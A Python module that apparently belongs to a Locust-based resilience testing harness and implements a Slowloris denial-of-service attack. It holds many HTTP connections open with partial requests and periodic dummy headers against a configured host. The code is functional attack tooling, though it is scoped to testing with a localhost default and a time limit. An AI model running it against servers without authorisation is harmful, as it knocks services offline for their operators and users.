#!/usr/bin/env python3
import threading
import time
import logging
import socket
from urllib.parse import urlparse


class Attack:
    def __init__(self, configuration, design_path, output_path, test_identifier):
        self.configuration = configuration
        self.base_url = configuration.get("locust_host_url") or "http://localhost"
        self.parsed = urlparse(self.base_url)
        self.host = self.parsed.hostname or "localhost"
        self.port = self.parsed.port or (443 if (self.parsed.scheme == "https") else 80)
        self.path = configuration.get("attack_slowloris_path") or "/"
        self.sockets_target = int(float(configuration.get("attack_slowloris_connections", 200)))
        self.send_interval = float(configuration.get("attack_slowloris_send_interval_seconds", 10))
        self.connect_timeout = float(configuration.get("attack_slowloris_connect_timeout_seconds", 3))

    def _init_socket(self):
        # Only plain HTTP slowloris; HTTPS would need TLS wrap and many servers mitigate it
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(self.connect_timeout)
        s.connect((self.host, self.port))
        req = f"GET {self.path} HTTP/1.1\r\nHost: {self.host}\r\nUser-Agent: slowloris\r\nAccept: */*\r\n"
        s.send(req.encode("utf-8"))
        return s

    def run(self, duration_seconds, stop_event):
        if self.parsed.scheme == "https":
            logging.warning("slowloris: HTTPS target detected; skipping as plain slowloris requires raw TLS handling.")
            # Sleep to occupy the window without action
            stop_event.wait(timeout=duration_seconds)
            return

        logging.info("slowloris: starting")
        end_ts = time.time() + duration_seconds
        sockets = []
        try:
            while (time.time() < end_ts) and (not stop_event.is_set()):
                # replenish sockets
                while len(sockets) < self.sockets_target and (time.time() < end_ts) and (not stop_event.is_set()):
                    try:
                        sockets.append(self._init_socket())
                    except Exception:
                        # brief backoff before retrying
                        time.sleep(0.1)
                        break

                # send keep-alive header lines slowly
                for i in range(len(sockets) - 1, -1, -1):
                    try:
                        sockets[i].send(b"X-a: b\r\n")
                    except Exception:
                        try:
                            sockets[i].close()
                        except Exception:
                            pass
                        sockets.pop(i)
                # wait for next tick or until stopped
                remaining = max(0.0, min(self.send_interval, end_ts - time.time()))
                if remaining <= 0:
                    break
                stop_event.wait(timeout=remaining)
        finally:
            for s in sockets:
                try:
                    s.close()
                except Exception:
                    pass
            logging.info("slowloris: finished")

